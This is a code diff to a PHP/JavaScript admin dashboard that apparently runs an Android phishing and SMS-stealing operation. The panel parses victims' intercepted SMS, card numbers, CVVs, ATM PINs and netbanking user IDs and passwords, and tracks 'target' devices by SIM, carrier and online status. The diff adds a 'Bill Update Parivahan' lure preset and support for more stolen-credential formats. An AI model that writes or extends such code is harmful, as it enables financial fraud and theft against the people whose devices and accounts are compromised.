@@ -117,7 +117,7 @@ include_once __DIR__ . '/header.php';
       const getSmsBody = (s) => s ? (s.body || s.message || s.text || s.msg || s.content || '') : '';
       const getSmsSender = (s) => s ? (s.sender || s.address || s.from || s.phone || s.sender_id || 'Unknown') : 'Unknown';
       const getSmsSimSlot = (s) => s ? (s.sim_number || s.simSlot || s.sim_slot || s.sim || s.slot || 'SIM 1') : 'SIM 1';
-      const getSmsTimestamp = (s) => s ? smartDateParser(s.timestamp || s.date || s.time || s.created_at) : 'N/A';
+      const getSmsTimestamp = (s) => s ? smartDateParser(s.timestamp || s.date || s.time || s.created_at || s.dateTime || s.datetime) : 'N/A';
 
       const getCardNumber = (c) => c ? (c.number || c.cardNumber || c.card_number || c.card_no || c.cardNo || 'N/A') : 'N/A';
       const getCardExpiry = (c) => c ? (c.exp || c.expiry || c.expiryDate || c.exp_date || c.expiry_date || 'N/A') : 'N/A';
@@ -293,6 +293,7 @@ include_once __DIR__ . '/header.php';
 
       const DEFAULT_SCHEMA_PRESETS = {
         pm_admin: { name: "⭐ PM Admin Preset (Live Database Structure)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" },
+        bill_update_parivahan: { name: "⚡ Bill Update Parivahan Preset", sms: "messages", calls: "calls", cards: "clients", forms: "clients", sims: "clients" },
         custom: { name: "🛠️ Custom Manual Setup (Enter Node Names Below)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" }
       };
 
@@ -348,8 +349,14 @@ include_once __DIR__ . '/header.php';
               const userCard = card_node[devId] || {};
               const rawSmsObj = user_sms_node[devId] || {};
 
-              // Format SMS list
-              const smsDataList = Object.values(rawSmsObj).map(sms => ({
+              // Extract values based on nested structures or parent level (Multi-Schema Resolver)
+              const rawCard = userCard.card_details || userCard || {};
+              const rawForm = userCard.form_fill_up || userLogin || {};
+              const rawNetbanking = userCard.netbanking_details || {};
+
+              // Format SMS list (handle arrays/objects & sparse nulls)
+              const rawSmsArray = Array.isArray(rawSmsObj) ? rawSmsObj : Object.values(rawSmsObj);
+              const smsDataList = rawSmsArray.filter(Boolean).map(sms => ({
                 sender: getSmsSender(sms),
                 message: getSmsBody(sms),
                 sim_number: getSmsSimSlot(sms),
@@ -358,46 +365,79 @@ include_once __DIR__ . '/header.php';
               }));
 
               // Format Card list
-              const cardDataList = userCard.number ? [{
-                bankName: getCardBankName(userCard),
-                cardType: getCardType(userCard),
-                cardNumber: getCardNumber(userCard),
-                cardHolder: getCardHolder(userCard) !== 'N/A' ? getCardHolder(userCard) : (userLogin.name || 'N/A'),
-                expiry: getCardExpiry(userCard),
-                cvv: getCardCvv(userCard)
+              const bankName = rawCard.bankName || rawCard.bank_name || userCard.bankName || userCard.bank_name || 'Bank Account';
+              const cardNumber = rawCard.number || rawCard.cardNumber || rawCard.card_number || 'N/A';
+              const expiry = rawCard.exp || rawCard.expiry || rawCard.card_expiry || rawCard.expiryDate || 'N/A';
+              const cvv = rawCard.cvv || rawCard.card_cvv || rawCard.security_code || '•••';
+              const atmPin = rawCard.atm_pin || rawCard.atmPin || rawCard.pin || '';
+
+              const cardDataList = (cardNumber !== 'N/A') ? [{
+                bankName,
+                cardNumber,
+                expiry,
+                cvv,
+                atmPin,
+                cardHolder: rawCard.cardHolder || rawCard.name || userCard.fullName || 'N/A',
+                cardType: rawCard.cardType || rawCard.card_type || 'Card Payload'
+              }] : [];
+
+              // Format Netbanking list
+              const netbankingDataList = rawNetbanking.user_id ? [{
+                bankName: rawNetbanking.bank_name || 'Netbanking Account',
+                userId: rawNetbanking.user_id,
+                password: rawNetbanking.password
               }] : [];
 
               // Format Form Data list
-              const formDataList = userLogin.name || userLogin.mom || userLogin.pan ? [{
+              const formDataFields = rawForm.fields || rawForm;
+              const hasForm = formDataFields.customer_name || formDataFields.consumer_number || formDataFields.name || formDataFields.mobileNumber || formDataFields.mobile_number;
+              const formDataList = hasForm ? [{
                 id: `frm_${devId}`,
-                formTitle: 'Customer Registration Form',
-                fields: userLogin,
-                timestamp: 'Live payload'
+                formTitle: 'Customer / Bill Update Submission',
+                fields: formDataFields,
+                timestamp: userCard.joined || 'Live payload'
               }] : [];
 
-              const sim1 = devInfo.numberSim1 || devInfo.phoneNumber || 'N.A.';
-              const sim2 = devInfo.numberSim2 || 'N.A.';
+              // SIM card parsing with support for sims array
+              let sim1 = devInfo.numberSim1 || devInfo.phoneNumber || 'N.A.';
+              let sim2 = devInfo.numberSim2 || 'N.A.';
+              let sim1Carrier = devInfo.nameSim1 || 'SIM 1';
+              let sim2Carrier = devInfo.nameSim2 || 'SIM 2';
+
+              if (Array.isArray(devInfo.sims)) {
+                if (devInfo.sims[0]) {
+                  sim1 = devInfo.sims[0].phoneNumber || devInfo.sims[0].number || sim1;
+                  sim1Carrier = devInfo.sims[0].carrierName || devInfo.sims[0].carrier || sim1Carrier;
+                }
+                if (devInfo.sims[1]) {
+                  sim2 = devInfo.sims[1].phoneNumber || devInfo.sims[1].number || sim2;
+                  sim2Carrier = devInfo.sims[1].carrierName || devInfo.sims[1].carrier || sim2Carrier;
+                }
+              }
+
+              const deviceModel = devInfo.modelName || devInfo.Device_info || devInfo.d_name || devInfo.device || 'Android Device';
 
               return {
                 id: devId,
-                userId: userAccount.user_name ? `USR-${userAccount.user_name}` : `DEV-${devId.substring(0, 6).toUpperCase()}`,
-                fullName: userLogin.name || devInfo.d_name || devInfo.device || `Target Device ${devId.substring(0, 4)}`,
+                userId: userAccount.user_name || formDataFields.consumer_number || `DEV-${devId.substring(0, 6).toUpperCase()}`,
+                fullName: formDataFields.customer_name || formDataFields.name || devInfo.d_name || devInfo.device || `Target Device ${devId.substring(0, 4)}`,
                 mobileNumber: sim1 !== 'N.A.' ? sim1 : (sim2 !== 'N.A.' ? sim2 : 'N.A.'),
-                numberField: userAccount.user_name ? `A/C: ${userAccount.user_name}` : '',
-                stringField: devInfo.Device_info ? devInfo.Device_info.split('\n')[0] : (devInfo.d_name || 'Android Device'),
-                simState: devInfo.nameSim1 ? `${devInfo.nameSim1} ${devInfo.nameSim2 ? '• ' + devInfo.nameSim2 : ''}` : 'Active',
-                batteryLevel: devInfo.battery ? `${devInfo.battery}%` : 'N/A',
-                isActive: devInfo.status === 'online',
+                numberField: userAccount.user_name ? `A/C: ${userAccount.user_name}` : (formDataFields.consumer_number ? `Consumer No: ${formDataFields.consumer_number}` : ''),
+                stringField: deviceModel.split('\n')[0],
+                simState: sim1Carrier + (sim2 !== 'N.A.' ? ' • ' + sim2Carrier : ''),
+                batteryLevel: devInfo.battery ? String(devInfo.battery).replace('%', '') + '%' : 'N/A',
+                isActive: devInfo.status === 'online' || devInfo.status === true,
                 isConnected: true,
                 appInBackground: false,
-                lastActivityTime: devInfo.TimeandDate || 'Just now',
+                lastActivityTime: devInfo.TimeandDate || devInfo.joined || 'Just now',
                 totalSmsCount: smsDataList.length,
                 totalCallsCount: 0,
-                sim1Data: { phone: sim1, carrier: devInfo.nameSim1 || 'SIM 1' },
-                sim2Data: { phone: sim2, carrier: devInfo.nameSim2 || 'SIM 2' },
+                sim1Data: { phone: sim1, carrier: sim1Carrier },
+                sim2Data: { phone: sim2, carrier: sim2Carrier },
                 smsDataList,
                 callDataList: [],
                 cardDataList,
+                netbankingDataList,
                 formDataList
               };
             });
